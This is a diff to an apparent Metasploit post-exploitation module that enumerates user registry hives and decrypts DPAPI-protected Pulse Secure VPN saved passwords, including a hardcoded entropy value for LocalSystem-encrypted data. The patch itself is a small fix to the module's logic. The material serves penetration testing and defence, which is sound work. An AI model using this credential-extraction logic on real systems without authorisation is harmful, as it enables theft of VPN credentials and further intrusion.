@@ -189,6 +189,7 @@ class MetasploitModule < Msf::Post
     # for each user profile, we check for potential connection ive
     profiles.each do |profile|
       key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
+      next unless key_names
       key_names.each do |key_name|
         ive_index = key_name[4..-1] # remove 'ive:'
         # We get the encrypted password value from registry
@@ -199,19 +200,16 @@ class MetasploitModule < Msf::Post
 
         vals.each do |val|
           data = registry_getvaldata(reg_path, val)
-          if is_system?
-            next unless data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
-
-            # this means data was encrypted by elevated user using LocalSystem scope and fixed
-            # pOptionalEntropy value, adjusting parameters
-            data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
-            entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
+          if is_system? and data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
+              # this means data was encrypted by elevated user using LocalSystem scope and fixed
+              # pOptionalEntropy value, adjusting parameters
+              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
+              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
           else
             # convert IVE index to DPAPI pOptionalEntropy value like PSC does
             entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack("c*")
           end
 
-          # it's not DPAPI data
           if !data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
             next
           end
